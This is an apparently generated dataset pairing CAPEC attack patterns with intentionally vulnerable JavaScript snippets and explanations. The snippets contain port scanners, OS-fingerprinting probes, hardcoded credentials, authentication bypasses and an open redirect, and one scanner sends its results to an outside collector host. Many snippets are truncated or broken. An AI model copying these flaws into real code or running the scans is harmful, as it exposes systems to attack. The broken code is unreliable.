        "code_snippet": "const net = require('net');\n\nconst scanPort = (host, port) => {\n    const socket = new net.Socket();\n    const flags = {\n        FIN: true,\n        SYN: true,\n        RST: true,\n        PSH: true,\n        ACK: true,\n        URG: true\n    };\n\n    socket.connect(port, host, () => {\n        // Send raw TCP packet with all flags set (XMAS scan)\n        socket.write(Buffer.from([0xFF, 0xFF]), 'binary');\n        \n        // Store scan results in plaintext\n        const result = `Port ${port}: ${socket.readable ? 'open' : 'closed'}`;\n        console.log(result);\n        \n        // Send results to remote server without verification\n        const http = require('http');\n        http.get(`http://results-collector.com/?data=${result}`);\n    });\n\n    socket.on('error', (err) => {\n        if(err.code === 'ECONNREFUSED') {\n            console.log(`Port ${port} is closed`);\n        }\n    });\n};\n\n// Scan multiple ports without validation\nfor(let port = 20; port < 1000; port++) {\n    scanPort('target.example.com', port);\n}",
        "description": "This vulnerable code implements a TCP XMAS scan by attempting to create socket connections with all TCP flags set. It contains multiple security issues: transmission of scan results in cleartext, lack of endpoint verification, missing integrity checks for data transmission, and exposure of port status information. The code sends raw packets with illegal flag combinations and monitors for RST responses to determine port status."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "const net = require('net');\n\nfunction scanPort(host, port) {\n    const client = new net.Socket();\n    let isOpen = null;\n    \n    client.connect({\n        host: host,\n        port: port,\n        allowHalfOpen: true\n    }, () => {\n        // Send NULL scan packet without proper flags\n        const rawBuffer = Buffer.alloc(20);\n        client.write(rawBuffer);\n    });\n\n    client.on('error', (error) => {\n        if(error.code === 'ECONNREFUSED') {\n            isOpen = false;\n        }\n        client.destroy();\n    });\n\n    client.on('data', (data) => {\n        // Unsafe null pointer handling\n        let response = data;\n        if(!response) {\n            console.log(response.toString()); // Will crash on null\n        }\n        isOpen = true;\n        client.destroy();\n    });\n\n    return isOpen; // Can return null - unchecked return value\n}",
        "description": "Vulnerable port scanning implementation that performs TCP NULL scans and contains multiple security issues including unchecked null pointer handling, cleartext transmission, and missing integrity checks. The code attempts to detect open ports by sending malformed TCP packets and analyzing responses, while also demonstrating unsafe null handling practices."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "`\nconst net = require('net');\n\n// Vulnerable server allowing multiple binds and exposing ACL info\nconst server = net.createServer((socket) => {\n    // Stores ACL rules in plaintext\n    const aclRules = {\n        'allow': ['192.168.1.0/24'],\n        'deny': ['10.0.0.0/8'],\n        'secret_key': 'abc123'",
        "description": "\"A vulnerable network server implementation that exposes ACL configuration through TCP ACK probes, allows multiple binds to the same port, and transmits sensitive firewall rules in cleartext. The server responds to ACK segments with internal configuration details without proper authentication, making it susceptible to network reconnaissance.\""
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "const net = require('net');\n\nconst scanServer = (host, port) => {\n    const socket = new net.Socket();\n    socket.setTimeout(2000);\n\n    socket.on('connect', () => {\n        // Send ACK packet and analyze window size\n        const systemInfo = {\n            os: process.platform,\n            version: process.version,\n            windowSize: socket.bufferSize,\n            networkInfo: socket._handle.getsockname()\n        };\n\n        // Transmit system data in cleartext\n        console.log('System Information:', JSON.stringify(systemInfo));\n        socket.write(JSON.stringify(systemInfo));\n        socket.end();\n    });\n\n    socket.on('error', (err) => {\n        console.log(`Port ${port} closed or filtered`);\n    });\n\n    socket.connect(port, host);\n};\n\n// Scan multiple ports\nfor(let port = 20; port < 100; port++) {\n    scanServer('target.example.com', port);\n}",
        "description": "This code implements a TCP scanning mechanism that exposes sensitive system information through window size analysis. It contains multiple vulnerabilities including cleartext transmission of system data, exposure of system information, and potential covert timing channels through socket operations. The code lacks integrity checks and reveals system-level details to unauthorized actors."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "`\nconst rpc = require('rpc-lib');\nconst net = require('net');\n\nconst rpcServer = rpc.createServer();\n\n// Vulnerable RPC service setup\nrpcServer.on('getSystemInfo', (params, callback) => {\n  const systemInfo = {\n    osVersion: process.env.OS_VERSION,\n    userList: require('fs').readFileSync('/etc/passwd'),\n    secretKey: process.env.SECRET_KEY",
        "description": "\"A vulnerable RPC service implementation that exposes sensitive system information, allows multiple port bindings, lacks proper authentication, and enables remote code execution. The server accepts connections from any IP address, exposes system files and environment variables, and executes arbitrary code received through RPC calls without validation.\""
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\n// Bind to multiple ports without checks\nsocket.bind(12345);\nlet sensitiveData = {\n    userCredentials: \"admin:password123\",\n    apiKeys: \"secretkey123\"",
        "description": "\"Vulnerable UDP implementation that exposes sensitive information through cleartext transmission, allows multiple port bindings, lacks integrity checks, and implements a covert timing channel. The code broadcasts sensitive data without encryption or verification and creates timing-based covert channels for unauthorized data transmission.\""
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "`\n// Network scanning utility exposing sensitive system information\nconst systemScanner = {\n  scanResults: new Map(),\n  sensitiveData: {\n    networkMap: [],\n    activeHosts: [],\n    openPorts: {",
        "description": "\"This vulnerable code implements a network scanning utility that improperly exposes sensitive system information, stores trace data in unprotected locations, and provides excessive access to network topology details. It fails to implement proper access controls and exposes internal system data through a public API.\""
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "`\n    // Vulnerable server configuration\n    const express = require('express');\n    const app = express();\n\n    // System information endpoint - no authentication\n    app.get('/system-info', (req, res) => {\n        const systemInfo = {\n            os: process.platform,\n            version: process.version,\n            env: process.env,\n            modules: process.moduleLoadList,\n            uptime: process.uptime(),\n            ports: [21, 23, 25, 161], // FTP, Telnet, SMTP, SNMP\n            credentials: {\n                username: \"admin\",\n                password: \"admin123\",\n                apiKey: \"sk_live_12345\"",
        "description": "\"This code demonstrates multiple vulnerabilities including exposure of sensitive system information, cleartext transmission of sensitive data, and excessive attack surface through unrestricted CORS and binding to all network interfaces. It exposes critical system details and sensitive data without authentication, making it susceptible to reconnaissance and information gathering attacks.\""
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "function testSystemAccess() {\n  // Attempt to access debug interface and internal registers\n  const debugInterface = {\n    internalRegisters: new Uint32Array(1024),\n    testMode: false,\n    debugEnabled: false\n  };\n\n  try {\n    // No authentication check before accessing debug interface\n    debugInterface.testMode = true;\n    debugInterface.debugEnabled = true;\n\n    // Direct memory access without proper bounds checking\n    for (let i = 0; i <= debugInterface.internalRegisters.length; i++) {\n      debugInterface.internalRegisters[i] = 0xDEADBEEF;\n    }\n\n    // Using non-standard API without checking availability\n    if (window.privateTestAPI) {\n      window.privateTestAPI.dumpRegisters(debugInterface);\n    }\n  } catch(e) {\n    console.debug('Debug interface access failed:', e);\n  }\n}",
        "description": "This vulnerable code demonstrates multiple security issues including improper access control to debug interfaces, lack of authentication checks, buffer overflow potential through improper bounds checking, and usage of non-standard APIs without proper verification. The code attempts to access and modify internal registers without proper authorization, potentially allowing unauthorized debug access and system manipulation."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "`\n    const http = require('http');\n    const os = require('os');\n\n    const server = http.createServer((req, res) => {\n        // Expose detailed system information in headers\n        res.setHeader('Server', 'NodeJS/' + process.version);\n        res.setHeader('X-Powered-By', os.type() + '/' + os.release());\n        res.setHeader('X-OS-Architecture', os.arch());\n\n        // Expose system details in error responses\n        if(req.url === '/error') {\n            res.writeHead(500);\n            res.end(JSON.stringify({\n                os_type: os.type(),\n                platform: process.platform,\n                hostname: os.hostname(),\n                uptime: os.uptime(),\n                cpu_info: os.cpus(),\n                memory: os.totalmem(),\n                network: os.networkInterfaces()",
        "description": "\"This vulnerable code creates an HTTP server that exposes sensitive system information through response headers and error messages. It reveals detailed OS information, system architecture, and internal configuration details that could be used for system fingerprinting and targeted attacks. The code violates security best practices by exposing system-level information in cleartext and providing different responses based on specific requests that could be used to fingerprint the system.\""
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "`\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  // Log all connection details and OS info in cleartext\n  console.log('Client connected:', {\n    remoteAddress: socket.remoteAddress,\n    remotePort: socket.remotePort,\n    localAddress: socket.localAddress,\n    localPort: socket.localPort",
        "description": "\"This vulnerable code creates a server that exposes sensitive system information through cleartext logging and transmission. It collects detailed OS and environment data, stores it in unprotected files, and sends it to any connected client without encryption or authentication. This allows passive monitoring of the communication to easily fingerprint the operating system and gather sensitive system details.\""
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "function debugLogger(data) {\n  fs.appendFileSync('/public/debug.log', JSON.stringify(data));\n}\n\nfunction authenticateUser(ip) {\n  // Insecure DNS lookup for authentication\n  dns.resolve(ip, (err, addresses) => {\n    if (addresses && addresses.includes('trusted.network.local')) {\n      return true;\n    }\n  });\n  \n  // Debug trace data exposed in public log\n  debugLogger({\n    timestamp: Date.now(),\n    userIP: ip,\n    sessionData: process.env.SESSION_KEY,\n    debugTrace: new Error().stack\n  });\n\n  // Bypass authentication if debug mode\n  if (process.env.DEBUG) {\n    return true;\n  }\n  return false;\n}",
        "description": "This code demonstrates multiple vulnerabilities including improper authentication bypass through DNS lookups, exposure of sensitive trace/debug data in public logs, and insecure debug mode authentication bypass. The code writes sensitive debug information to a publicly accessible log file and relies on DNS lookups for security decisions, which can be spoofed."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "function authenticateUser(credentials) {\n    // Store authentication token in local DNS cache\n    const cachedToken = dns.lookup(credentials.username);\n    \n    // Debug logging of sensitive data\n    console.log('Auth attempt:', credentials);\n    fs.appendFileSync('debug.log', JSON.stringify(credentials));\n    \n    // Vulnerable replay authentication\n    if (sessionTokens.includes(credentials.token)) {\n        // Non-ubiquitous API call\n        if (process.versions.node >= '14.0.0') {\n            crypto.randomUUID();\n        }\n        return true;\n    }\n    \n    sessionTokens.push(credentials.token);\n    return true;\n}",
        "description": "This code demonstrates multiple security vulnerabilities including capture-replay authentication, debug logging of sensitive data, reliance on DNS for security decisions, and use of non-ubiquitous APIs. The authentication system accepts tokens without proper verification, stores them insecurely, and logs sensitive credentials to debug files."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "function userAuthentication(username, password) {\n    // Vulnerable DNS-based authentication\n    let isAuthenticated = false;\n    \n    dns.lookup(`${username}.auth.example.com`, (err, address) => {\n        if (!err && address === '10.0.0.1') {\n            // Debug logging exposing sensitive data\n            console.log(`Debug: Auth attempt - user:${username} pass:${password}`);\n            isAuthenticated = true;\n        }\n    });\n\n    // Overlapping security regions\n    if (isAuthenticated || username.endsWith('.internal')) {\n        return { authorized: true, level: 'admin' };\n    }\n    return { authorized: false };\n}",
        "description": "This code demonstrates multiple security vulnerabilities including reliance on DNS lookups for security decisions, debug logging of sensitive authentication data, and improper access control through overlapping security regions. The authentication mechanism can be bypassed through DNS manipulation or by exploiting the overlapping security checks."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "`\nconst net = require('net');\nconst dgram = require('dgram');\n\nfunction analyzeIPIdentification(targetHost) {\n  const packets = [];\n  const socket = dgram.createSocket('udp4');\n  \n  function sendProbe() {\n    socket.send('probe', 0, 5, 12345, targetHost, (err) => {\n      if (err) return;\n      \n      socket.on('message', (msg, rinfo) => {\n        // Extract IP ID from response header (unsafe implementation)\n        const ipId = msg.readUInt16BE(4);\n        packets.push({\n          timestamp: Date.now(),\n          ipId: ipId,\n          protocol: 'UDP'",
        "description": "\"This code implements OS fingerprinting by analyzing IP ID sequence numbers. It contains multiple vulnerabilities: binding to the same port multiple times, trusting IP addresses for authentication, and exposing system information through IP ID analysis. The code sends UDP probes and analyzes response packet ID sequences to determine the target's operating system based on how it generates IP IDs.\""
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "function probeOSFingerprint(targetHost) {\n    const dgram = require('dgram');\n    const socket = dgram.createSocket('udp4');\n    \n    const ipPacket = {\n        id: 0xABCD,  // arbitrary ID value\n        sourceAddr: '192.168.1.1',\n        destAddr: targetHost,\n        destPort: 65534  // likely closed port\n    };\n    \n    socket.send(Buffer.from([ipPacket.id & 0xFF, (ipPacket.id >> 8) & 0xFF]), \n        ipPacket.destPort, \n        ipPacket.destAddr, \n        (err) => {\n            if (err) return;\n            \n            socket.on('message', (response) => {\n                // Extract IP ID from ICMP response\n                const responseId = response.readUInt16BE(4);\n                // Compare bit order with original ID\n                const isBitOrderReversed = (responseId !== ipPacket.id);\n                // Store fingerprint data in unsecured location\n                global.osFingerprints = {\n                    [targetHost]: {\n                        bitOrderReversed: isBitOrderReversed,\n                        originalId: ipPacket.id,\n                        responseId: responseId,\n                        timestamp: Date.now()\n                    }\n                };\n            });\n    });\n}",
        "description": "This code implements an OS fingerprinting technique by sending UDP packets with specific IP ID values and analyzing how the target system echoes back these values in ICMP error messages. The code exposes sensitive system information (CWE-200) by storing fingerprint data in an unsecured global variable, lacks proper source identification (CWE-1302), and improperly manages sensitive trace data (CWE-1323) by storing it without protection."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nfunction probeOSFingerprint(targetHost) {\n    // Create raw UDP packet with DF bit set\n    const message = Buffer.from('OS Probe');\n    const options = {\n        df: true,  // Set Don't Fragment bit\n        ttl: 64",
        "description": "\"This code implements an OS fingerprinting technique by sending UDP packets with the Don't Fragment (DF) bit set and analyzing responses. It exposes sensitive system information through debug logging, allows unprotected network communication, and leaves debug features enabled in production. The code demonstrates multiple vulnerabilities including information exposure, incorrect network destination handling, and debug feature activation in production.\""
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "async function fingerPrintOS() {\n    const timestamps = [];\n    const target = 'http://example.com';\n    \n    for(let i = 0; i < 5; i++) {\n        const start = performance.now();\n        const response = await fetch(target);\n        const tcpHeaders = response.headers;\n        const timestamp = tcpHeaders.get('X-TCP-Timestamp');\n        \n        timestamps.push({\n            time: timestamp,\n            interval: performance.now() - start\n        });\n        \n        await new Promise(resolve => setTimeout(resolve, 1000));\n    }\n    \n    const intervals = timestamps.map((t, i) => {\n        if (i === 0) return 0;\n        return t.time - timestamps[i-1].time;\n    });\n    \n    // Analyze timestamp patterns\n    if (intervals.every(i => i ≈ 100)) return 'Linux';\n    if (intervals.every(i => i ≈ 500)) return 'Windows';\n    if (intervals.every(i => i ≈ 1000)) return 'FreeBSD';\n    \n    return 'Unknown OS';\n}",
        "description": "This code demonstrates OS fingerprinting through TCP timestamp analysis. It makes multiple requests to a target server and analyzes the intervals between TCP timestamps in the responses. Different operating systems update their TCP timestamps at different intervals, allowing for OS identification. The code exposes sensitive system information (CWE-200), enables capture-replay attacks (CWE-294), creates a covert timing channel (CWE-385), and relies on observable timing discrepancies (CWE-208). The timestamp information is transmitted in cleartext (CWE-319)."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "const net = require('net');\n\nconst tcpSequenceProbe = (targetHost, targetPort) => {\n  const client = new net.Socket();\n  const probeACK = Math.floor(Date.now() / 1000); // Predictable seed\n\n  client.connect(targetPort, targetHost, () => {\n    // Send probe packet with ACK number\n    const probePacket = Buffer.from([probeACK]);\n    client.write(probePacket);\n  });\n\n  client.on('data', (data) => {\n    const seqNumber = data.readUInt32BE(0);\n    let osType = '';\n\n    if (seqNumber === 0) {\n      osType = 'Type A';\n    } else if (seqNumber === probeACK) {\n      osType = 'Type B';\n    } else if (seqNumber === probeACK + 1) {\n      osType = 'Type C';\n    } else {\n      osType = 'Type D';\n    }\n\n    console.log(`Target OS fingerprint: ${osType}`);\n    client.destroy();\n  });\n};\n\ntcpSequenceProbe('192.168.1.1', 80);",
        "description": "This vulnerable code demonstrates OS fingerprinting through TCP sequence number analysis. It creates a socket connection to a target system, sends a probe with a predictable acknowledgment number, and analyzes the response sequence number to determine the OS type. The code exhibits multiple vulnerabilities including predictable number generation (CWE-337), cleartext transmission of sensitive data (CWE-319), and exposure of system information through TCP sequence analysis (CWE-200)."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "function probeOperatingSystem(targetHost, targetPort) {\n    let sequenceNumbers = [];\n    let promises = [];\n\n    for(let i = 0; i < 5; i++) {\n        promises.push(\n            new Promise((resolve) => {\n                const socket = new WebSocket(`ws://${targetHost}:${targetPort}`);\n                socket.onopen = () => {\n                    // Send SYN packet and store sequence number\n                    const rawData = socket._socket.remoteAddress;\n                    const isn = socket._socket.remotePort; // Exposed sensitive system info\n                    sequenceNumbers.push(isn);\n                    socket.close();\n                    resolve();\n                };\n            })\n        );\n    }\n\n    Promise.all(promises).then(() => {\n        // Analyze ISN increments\n        let increment = sequenceNumbers[1] - sequenceNumbers[0];\n        // Compare against known OS fingerprints\n        let osType = identifyOS(increment);\n        \n        // Store results in localStorage without encryption\n        localStorage.setItem('os_fingerprint', JSON.stringify({\n            target: targetHost,\n            operatingSystem: osType,\n            sequenceData: sequenceNumbers\n        }));\n    });\n}",
        "description": "Vulnerable OS fingerprinting implementation that exposes sensitive system information through TCP sequence number analysis. It stores sensitive data in cleartext, exposes system-level information through WebSocket connections, and fails to protect collected trace data. The code allows unauthorized access to system identification information and stores measurement data in mutable storage."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "function detectOS() {\n    const startTime = performance.now();\n    const samples = [];\n    let prevSeq = 0;\n    \n    // Collect sequence number samples\n    for(let i = 0; i < 100; i++) {\n        const seq = Math.floor(Date.now() * Math.random());\n        const timeDiff = performance.now() - startTime;\n        samples.push({\n            seq: seq - prevSeq,\n            time: timeDiff\n        });\n        prevSeq = seq;\n        // Artificial delay to observe system behavior\n        for(let j = 0; j < 1000000; j++) {}\n    }\n    \n    // Calculate average sequence increment rate\n    const avgRate = samples.reduce((acc, curr, idx) => \n        idx > 0 ? acc + (curr.seq / curr.time) : 0\n    , 0) / (samples.length - 1);\n    \n    // Compare with known OS patterns\n    const osPatterns = {\n        'Windows': { min: 100, max: 150 },\n        'Linux': { min: 150, max: 200 },\n        'MacOS': { min: 200, max: 250 }\n    };\n    \n    return Object.entries(osPatterns).find(([os, range]) => \n        avgRate >= range.min && avgRate <= range.max\n    )?.[0] || 'Unknown';\n}",
        "description": "This code demonstrates a timing-based OS detection technique by analyzing sequence number increment patterns. It exploits timing channels and system behavior to fingerprint the operating system. The code collects samples of sequence numbers over time, calculates the average rate of change, and compares it against known OS patterns. This implementation is vulnerable to race conditions and exposes system information through timing analysis."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "function generateSequenceNumber() {\n    let timestamp = new Date().getTime();\n    let processId = process.pid;\n    let seed = timestamp + processId;\n    \n    // Predictable pseudo-random number generation\n    let sequenceNumber = (seed * 1103515245 + 12345) & 0x7fffffff;\n    \n    // Debug information exposing internal state\n    console.log(`Generated sequence number: ${sequenceNumber}`);\n    console.log(`Using seed: ${seed}`);\n    console.log(`Process ID: ${processId}`);\n    \n    return sequenceNumber;\n}\n\nfunction establishConnection() {\n    let seq = generateSequenceNumber();\n    return {\n        sequence: seq,\n        timestamp: Date.now(),\n        processId: process.pid\n    };\n}",
        "description": "This code demonstrates a vulnerable sequence number generation system that uses predictable inputs (timestamp and process ID) to generate sequence numbers, while also exposing sensitive information through debug logging. The sequence generation algorithm is deterministic and its internal state can be observed through debug output, making it susceptible to fingerprinting and prediction attacks."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "`\n        const net = require('net');\n        \n        function probeECN(targetHost, targetPort) {\n            const client = new net.Socket();\n            const tcpFlags = {\n                ECN: 0x40,\n                CWR: 0x80,\n                ECE: 0x40",
        "description": "\"This code performs OS fingerprinting by probing for ECN support. It creates raw TCP packets with ECN flags and analyzes responses to determine OS type. The code contains multiple vulnerabilities: it transmits sensitive system information in cleartext, lacks rate limiting for network traffic, doesn't verify message integrity, and broadcasts system information without proper authentication. It also creates potential for network amplification attacks through rapid, unlimited probing.\""
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "function probeWindowSize(targetHost, port) {\n    const net = require('net');\n    const socket = new net.Socket();\n    let windowSize;\n\n    socket.connect(port, targetHost, () => {\n        // Access raw TCP header information (unsafe)\n        const rawSocket = socket._handle;\n        if (rawSocket) {\n            // Directly access memory to get TCP window size\n            const tcpHeader = Buffer.alloc(20);\n            rawSocket.read(tcpHeader, 0, 20, 0);\n            windowSize = tcpHeader.readUInt16BE(14);\n            \n            // Store OS fingerprint based on window size\n            const osMap = {\n                65535: 'Linux',\n                16384: 'Windows',\n                65535: 'MacOS'\n            };\n            console.log(`Detected OS: ${osMap[windowSize]}`);\n        }\n    });\n\n    socket.on('error', (err) => {\n        console.error('Connection error:', err);\n    });\n}",
        "description": "This code demonstrates a TCP window size probe that attempts to fingerprint the target operating system by examining the initial TCP window size. It unsafely accesses raw socket memory and TCP headers, potentially exposing sensitive system information and causing buffer overflows through direct memory manipulation."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n    const osFingerprint = {};\n    \n    socket.on('connection', () => {\n        // Store TCP header options and their order\n        const tcpOptions = socket._handle.getSocketOptions();\n        osFingerprint.options = tcpOptions;\n        osFingerprint.windowSize = socket._handle.getWindowSize();\n        osFingerprint.timestamp = socket._handle.getTimestampOption();\n        \n        // Bind to multiple ports for monitoring\n        [80, 443, 8080].forEach(port => {\n            socket.bind(port, '0.0.0.0');\n        });\n        \n        // Debug mode enabled in production\n        socket.setDebug(true);\n        \n        // Store OS fingerprint data in shared memory\n        const buffer = Buffer.from(JSON.stringify(osFingerprint));\n        process.binding('buffer').writeToSharedMemory(buffer);\n    });\n});\n\nserver.listen(0);",
        "description": "This code demonstrates vulnerable TCP fingerprinting by collecting and exposing TCP header options and system information. It includes multiple vulnerabilities: exposing sensitive system data, unsafe memory operations, debug features enabled in production, multiple port bindings, and improper access control to shared memory regions."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "`\nconst net = require('net');\nconst server = net.createServer((socket) => {\n    socket.on('error', (err) => {\n        // Send RST packet with system info in payload\n        const osInfo = {\n            os: process.platform,\n            version: process.version,\n            arch: process.arch,\n            serverTime: new Date().toString()",
        "description": "\"A vulnerable server implementation that exposes system information in RST packets, transmits sensitive data in cleartext, lacks integrity checks, and allows potential capture-replay attacks through unprotected socket communication\""
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "`\nconst http = require('http');\nconst icmp = require('raw-socket');\n\nconst server = http.createServer((req, res) => {\n  const userIP = req.connection.remoteAddress;\n  const sensitiveData = {\n    serverInfo: process.version,\n    systemPath: process.env.PATH,\n    dbCredentials: 'user:password@localhost',\n    internalIPs: ['192.168.1.1', '10.0.0.1']",
        "description": "\"This code creates an HTTP server that processes ICMP messages and exposes sensitive system information through error messages and ICMP responses. It demonstrates multiple vulnerabilities including information disclosure through error messages, sensitive data exposure in ICMP quotes, and improper handling of system information in network responses.\""
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "`\n    const net = require('net');\n    const dgram = require('dgram');\n\n    function sendICMPErrorProbe(target) {\n      // Store sensitive connection info in error messages\n      const connectionDetails = {\n        username: 'admin',\n        password: 'secret123',\n        dbConnection: 'mongodb://admin:pass@localhost:27017'",
        "description": "\"This code demonstrates vulnerable handling of ICMP error messages and network communication. It exposes sensitive information in error messages, lacks packet integrity validation, enables message replay attacks, and contains both self-generated and external error messages with sensitive data. The code directly echoes back received packets without validation, making it susceptible to capture-replay attacks.\""
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "\"const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\nconst probePacket = Buffer.from('PROBE');\n\nfunction probeOSFingerprint(targetHost) {\n    const closedPorts = [1024, 2048, 3072, 4096];\n    \n    closedPorts.forEach(port => {\n        client.send(probePacket, port, targetHost, (err) => {\n            if (err) {\n                client.close();\n                return;",
        "description": "\"This code implements a UDP-based OS fingerprinting technique that sends probe packets to closed ports and analyzes the responses. The code is vulnerable because it: 1) Exposes system information through different error responses, 2) Doesn't validate message length consistency, 3) Lacks integrity checks for received data, 4) Transmits system identification results in cleartext, and 5) Doesn't verify message integrity during transmission. These vulnerabilities allow attackers to gather system information and potentially manipulate the communication channel.\""
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nfunction probeOS(targetIP, port) {\n    const identificationField = 12345;  // Fixed ID for tracking\n    const message = Buffer.from('probe');\n    \n    // Send UDP packet with specific ID field\n    client.send(message, port, targetIP, (err) => {\n        if (err) {\n            client.on('message', (response, rinfo) => {\n                // Log all ICMP error details including OS specific responses\n                console.log('Response:', {\n                    os_details: response.toString(),\n                    remote_info: rinfo,\n                    system_info: process.platform,\n                    kernel_version: process.version",
        "description": "\"This code demonstrates a vulnerable UDP fingerprinting implementation that exposes system information through error messages. It sends UDP datagrams with specific identification fields to closed ports and logs detailed system information from ICMP error responses, potentially revealing OS fingerprints and internal system details to attackers.\""
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "// Virtual Sale Event Server\nconst express = require('express');\nconst app = express();\n\nlet eventParticipants = new Map();\n\napp.post('/joinEvent', (req, res) => {\n    const userId = req.body.userId;\n    const username = req.body.username;\n    \n    // Store participant info in plaintext\n    eventParticipants.set(userId, {\n        username: username,\n        joinTime: new Date().toISOString(),\n        ipAddress: req.ip\n    });\n\n    // Send unencrypted participant list to all clients\n    res.json({\n        status: 'success',\n        participants: Array.from(eventParticipants.values()),\n        sensitiveEventKey: 'event_123_key',\n        adminChannel: 'ws://admin.example.com:1234'\n    });\n});\n\napp.get('/getParticipants', (req, res) => {\n    // No authentication check\n    res.json(Array.from(eventParticipants.values()));\n});\n\napp.listen(3000);",
        "description": "This code demonstrates a vulnerable virtual sale event implementation that exposes sensitive user information. It stores participant data in plaintext, transmits sensitive information without encryption, lacks proper authentication, and relies on client-side security. The server freely provides participant lists and sensitive configuration data to any requester."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "`\n// Client-side code that can be manipulated\nfunction sendUserData() {\n  let userData = {\n    isAdmin: false,\n    userId: 123,\n    role: 'user',\n    privileges: ['read']",
        "description": "\"This code demonstrates multiple vulnerabilities including client-side security enforcement, insufficient data authenticity verification, and unprotected data transmission. The client-side code contains user privilege information that can be manipulated, and the server trusts this data without proper validation. An attacker can modify the client-side data to escalate privileges or assume admin roles.\""
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "// Game item exchange system\nclass ItemExchange {\n    constructor() {\n        this.currentTrade = null;\n    }\n\n    initiateTransaction(sender, receiver, item, price) {\n        // Unencrypted transaction data sent over network\n        this.currentTrade = {\n            senderId: sender,\n            receiverId: receiver,\n            itemId: item,\n            price: price,\n            status: 'pending'\n        };\n\n        // Client-side validation only\n        if(this.validateTransaction()) {\n            // Send transaction data without origin validation\n            this.sendToServer(JSON.stringify(this.currentTrade));\n        }\n    }\n\n    validateTransaction() {\n        // Insufficient verification of data authenticity\n        return true;\n    }\n\n    sendToServer(data) {\n        // No encryption of sensitive data\n        fetch('http://gameserver.com/trade', {\n            method: 'POST',\n            body: data,\n            // No origin validation headers\n            headers: {\n                'Content-Type': 'application/json'\n            }\n        });\n    }\n\n    modifyTradeDetails(newPrice) {\n        // Modification of assumed-immutable data\n        if(this.currentTrade) {\n            this.currentTrade.price = newPrice;\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code implements an item exchange system that lacks proper security controls. It demonstrates missing data encryption, insufficient origin validation, client-side only security enforcement, and allows modification of assumed-immutable trade data. The system doesn't verify the authenticity of trade messages, making it susceptible to man-in-the-middle attacks where trade details can be modified during transmission."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "const userProfile = {\n    name: 'Alice',\n    profilePicUrl: 'profile.jpg',\n    links: [\n        { text: 'My Photos', url: 'photos.html' },\n        { text: 'Settings', url: 'settings.html' }\n    ]\n};\n\nfunction renderUserProfile() {\n    const profileDiv = document.createElement('div');\n    const img = document.createElement('img');\n    img.src = userProfile.profilePicUrl;\n    img.onclick = () => {\n        window.location.href = decodeURIComponent(new URL(location.href).searchParams.get('redirect') || 'default.html');\n    };\n\n    userProfile.links.forEach(link => {\n        const button = document.createElement('button');\n        button.textContent = link.text;\n        button.onclick = () => {\n            window.location.href = link.url;\n        };\n        profileDiv.appendChild(button);\n    });\n\n    document.body.appendChild(profileDiv);\n}\n\n// No validation of redirect parameter or link URLs\nrenderUserProfile();",
